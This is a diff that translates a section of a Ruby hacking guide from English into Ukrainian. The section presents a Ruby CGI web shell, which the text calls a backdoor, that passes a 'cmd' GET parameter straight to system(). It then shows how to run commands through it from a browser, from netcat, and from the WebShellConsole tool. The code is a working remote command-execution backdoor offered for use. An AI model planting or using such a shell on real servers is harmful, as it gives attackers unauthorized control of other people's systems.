@@ -269,9 +269,10 @@ File.chmod(0200, file)  # To prevent public access to the log file
 puts ""
 ```
 
-### Web Shell[^1] - command execution via GET
+### Web Shell[^1] - Запускач команд за допомогою GET запитів
 
-if you have a server that supports ruby CGI, you can use the following as backdoor
+Якщо у вас є сервер, що підтримує ruby CGI, ви можете використовувати наступний бекдор:
+
 ```ruby
 #!/usr/bin/env ruby
 require 'cgi'
@@ -279,9 +280,10 @@ cgi = CGI.new
 puts cgi.header
 system(cgi['cmd'])
 ```
-Now you can simply use a web browser, Netcat or WebShellConsole[^1] to execute your commands.
-ex.
-**Browser**
+Тепер ви можете використовувати ваш переглядач тенет або WebShellConsole[^1] для запуску потрібних вам команд.
+
+Наприклад.:
+**Переглядач тенет**
 ```
 http://host/cgi/shell.rb?cmd=ls -la
 ```
@@ -291,15 +293,16 @@ echo "GET /cgi/shell.rb?cmd=ls%20-la" | nc host 80
 ```
 **WebShellConsole**
 
-run wsc
+Запустіть wsc
 ```
 ruby wsc.rb
 ```
-Add Shell URL
+Додайте URL до вашого webshell-у
 ```
 Shell -> set http://host/cgi/shell.rb?cmd=
 ```
-Now prompt your commands
+тепер введіть потрібні вам команди:
+
 ```
 Shell -> ls -la
 ```
